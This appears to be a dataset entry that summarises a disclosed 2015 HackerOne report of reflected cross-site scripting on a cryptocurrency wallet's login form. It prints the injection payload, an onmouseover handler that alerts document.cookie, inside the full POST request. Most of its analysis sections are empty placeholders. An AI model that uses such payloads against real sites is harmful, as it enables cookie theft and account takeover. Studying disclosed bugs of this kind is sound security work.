# Cross site scripting

## Metadata
- **Source:** HackerOne
- **Report:** 63888 | https://hackerone.com/reports/63888
- **Submitted:** 2015-05-27
- **Reporter:** jaikeysarraf
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
page : 
https://wallet.romit.io/login

post data "email=xxx@xxx.com" set to "email[]=<a onmouseover=alert(document.cookie)>xxs link</a>"

full request data 
email[]=<a onmouseover=alert(document.cookie)>xxs link</a>&password=g00dPa%24%24w0rD&_csrf=5afeda5f-e604-4ba0-bd60-d83f975853c5

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

page : 
https://wallet.romit.io/login

post data "email=xxx@xxx.com" set to "email[]=<a onmouseover=alert(document.cookie)>xxs link</a>"

full request data 
email[]=<a onmouseover=alert(document.cookie)>xxs link</a>&password=g00dPa%24%24w0rD&_csrf=5afeda5f-e604-4ba0-bd60-d83f975853c5

</details>

---
*Analysed by Claude on 2026-05-24*
